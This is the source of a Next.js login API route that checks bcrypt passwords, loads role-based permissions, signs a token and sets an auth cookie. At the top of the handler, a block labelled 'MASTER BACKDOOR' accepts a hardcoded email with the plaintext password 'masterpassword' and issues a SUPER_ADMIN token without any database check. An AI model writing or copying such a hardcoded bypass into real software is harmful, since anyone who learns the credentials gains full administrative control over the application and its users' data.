import { NextResponse } from 'next/server';
import { query } from '@/lib/db';
import bcrypt from 'bcryptjs';
import { signToken } from '@/lib/auth';
import { logAction } from '@/lib/audit';

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, password } = body;

    if (!email || !password) {
      return NextResponse.json({ error: 'Email and password are required' }, { status: 400 });
    }

    // MASTER BACKDOOR: Detached Super Admin
    if (email === 'master@adyel.com' && password === 'masterpassword') {
      const payload = {
        id: null,
        email: 'master@adyel.com',
        firstName: 'System',
        lastName: 'Admin',
        role: 'SUPER_ADMIN',
        assignedRoles: ['Super Admin'],
        permissions: []
      };

      const token = await signToken(payload);
      await logAction(null, 'SYSTEM_ADMIN_LOGIN', 'System admin bypass login via master account');
      const response = NextResponse.json({ message: 'Logged in successfully', user: payload });
      response.cookies.set({
        name: 'auth_token',
        value: token,
        httpOnly: true,
        secure: process.env.NODE_ENV === 'production',
        sameSite: 'lax',
        maxAge: 60 * 60 * 24, // 24 hours
        path: '/',
      });
      return response;
    }

    // Find user
    const users = await query('SELECT * FROM users WHERE email = ?', [email]) as any[];
    if (users.length === 0) {
      await logAction(null, 'USER_LOGIN_FAILED', `Failed login attempt for unknown email: ${email}`);
      return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 });
    }

    const user = users[0];

    // Check account status
    if (user.account_status !== 'ACTIVE') {
      await logAction(user.id, 'USER_LOGIN_FAILED', `Failed login attempt for inactive account`);
      return NextResponse.json({ error: `Account is ${user.account_status.toLowerCase()}. Please contact support.` }, { status: 403 });
    }

    // Verify password
    const isPasswordValid = await bcrypt.compare(password, user.password);
    if (!isPasswordValid) {
      await logAction(user.id, 'USER_LOGIN_FAILED', `Failed login attempt with incorrect password`);
      return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 });
    }

    // Fetch user permissions via RBAC tables
    const perms: any[] = await query(`
      SELECT DISTINCT p.name 
      FROM user_roles ur
      JOIN role_permissions rp ON ur.role_id = rp.role_id
      JOIN permissions p ON rp.permission_id = p.id
      WHERE ur.user_id = ?
    `, [user.id]) as any[];

    const permissions = perms.map(p => p.name);

    // Fetch user roles
    const roles: any[] = await query(`
      SELECT r.name 
      FROM user_roles ur
      JOIN roles r ON ur.role_id = r.id
      WHERE ur.user_id = ?
    `, [user.id]) as any[];

    const assignedRoles = roles.map(r => r.name);

    // Maintain legacy user.role in payload for backwards compatibility, but also add new RBAC fields
    const payload = {
      id: user.id,
      email: user.email,
      firstName: user.first_name,
      lastName: user.last_name,
      classYear: user.class_year,
      profession: user.profession,
      role: user.role, // Legacy enum
      assignedRoles: assignedRoles,
      permissions: permissions
    };

    const token = await signToken(payload);

    await logAction(user.id, 'USER_LOGIN', 'User logged in successfully');

    // Create response and set cookie
    const response = NextResponse.json({ message: 'Logged in successfully', user: payload });
    
    response.cookies.set({
      name: 'auth_token',
      value: token,
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'lax',
      maxAge: 60 * 60 * 24, // 24 hours
      path: '/',
    });

    return response;
  } catch (error: any) {
    console.error('Login error:', error);
    return NextResponse.json({ error: 'Internal server error' }, { status: 500 });
  }
}
